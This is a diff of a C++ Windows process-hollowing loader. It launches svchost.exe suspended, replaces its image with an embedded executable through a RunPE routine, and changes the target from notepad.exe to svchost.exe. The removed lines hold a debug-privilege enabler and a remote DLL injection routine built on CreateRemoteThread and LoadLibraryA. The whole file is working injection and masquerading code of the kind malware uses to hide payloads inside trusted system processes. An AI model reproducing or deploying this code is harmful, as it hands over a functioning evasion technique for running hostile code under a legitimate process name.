@@ -50,25 +50,7 @@ ProcessAddressInformation GetProcessAddressInformation(HANDLE hProcess) {
     return addressInfo;
 }
 
-// Function to enable debug privileges
-bool EnableDebugPrivilege() {
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tkp;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        std::cerr << "[error] Failed to open process token. Error: " << GetLastError() << "\n";
-        return false;
-    }
-    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
-        std::cerr << "[error] Failed to lookup privilege value. Error: " << GetLastError() << "\n";
-        CloseHandle(hToken);
-        return false;
-    }
-    tkp.PrivilegeCount = 1;
-    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), nullptr, nullptr);
-    CloseHandle(hToken);
-    return GetLastError() == ERROR_SUCCESS;
-}
+
 
 // Unmap the existing executable and allocate space for the new one
 void UnmapAndAllocate(HANDLE hProcess, PVOID imageBase, size_t imageSize) {
@@ -152,69 +134,16 @@ bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
     return true;
 }
 
-// Function to load a DLL into the target process
-bool LoadRemoteLibrary(HANDLE hProcess, const char* dllPath) {
-    LPVOID pRemoteString = VirtualAllocEx(hProcess, nullptr, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-    if (!pRemoteString) {
-        std::cerr << "[error] Failed to allocate memory in target process. Error: " << GetLastError() << "\n";
-        return false;
-    }
-
-    if (!WriteProcessMemory(hProcess, pRemoteString, dllPath, strlen(dllPath) + 1, nullptr)) {
-        std::cerr << "[error] Failed to write to target process memory. Error: " << GetLastError() << "\n";
-        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
-        return false;
-    }
-
-    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteString, 0, nullptr);
-    if (!hThread) {
-        std::cerr << "[error] Failed to create remote thread. Error: " << GetLastError() << "\n";
-        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
-        return false;
-    }
-
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
-    return true;
-}
-
-// Load required DLLs into the target process
-void LoadRequiredDLLs(HANDLE hProcess) {
-    const char* dlls[] = {
-        "C:\\Windows\\System32\\kernel32.dll", // Core Windows API
-        "C:\\Windows\\System32\\user32.dll",   // UI components
-        "C:\\Windows\\System32\\msvcrt.dll"    // C runtime
-    };
-
-    for (const char* dllPath : dlls) {
-        if (!LoadRemoteLibrary(hProcess, dllPath)) {
-            std::cerr << "[error] Failed to load " << dllPath << " in target process.\n";
-        } else {
-            std::cout << "[info] Successfully loaded " << dllPath << " in target process.\n";
-        }
-    }
-}
-
-
 int main() {
-    if (!EnableDebugPrivilege()) {
-        std::cerr << "[error] Failed to enable debug privilege.\n";
-        return -1;
-    }
-
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi;
-    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
+    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
         std::cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
         return -1;
     }
 
-    // Load necessary DLLs into the target process
-    LoadRequiredDLLs(pi.hProcess);
-
     // Execute the process hollowing
-    if (!RunPE(pi.hProcess, pi.hThread, hello_world_exe, sizeof(hello_world_exe))) {
+    if (!RunPE(pi.hProcess, pi.hThread, hello_world_exe_exe, sizeof(hello_world_exe_exe))) {
         std::cerr << "[error] Process hollowing failed.\n";
         TerminateProcess(pi.hProcess, 0);
     }
